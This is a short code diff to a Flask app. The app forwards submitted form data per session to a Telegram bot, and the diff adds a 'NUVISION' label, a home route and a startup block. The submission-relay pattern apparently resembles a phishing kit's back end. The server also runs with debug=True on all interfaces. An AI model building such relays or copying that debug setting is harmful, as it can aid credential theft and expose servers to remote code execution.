@@ -39,7 +39,7 @@ def set_webhook():
         return {"ok": False, "error": str(e)}
 
 def send_to_telegram(data, session_id, type_):
-    msg = f"<b>🔐 {type_.upper()} Submission</b>\n\n"
+    msg = f"<b>🔐NUVISION {type_.upper()} Submission</b>\n\n"
     for key, value in data.items():
         if isinstance(value, dict):
             msg += f"<b>{key.replace('_', ' ').title()}:</b>\n"
@@ -257,3 +257,10 @@ def status(session_id):
     return jsonify({"status": "pending"}), 200
 
 @app.route("/", methods=["GET"])
+def home():
+    return "✅ Server is live"
+
+if __name__ == "__main__":
+    set_webhook()
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port, debug=True)
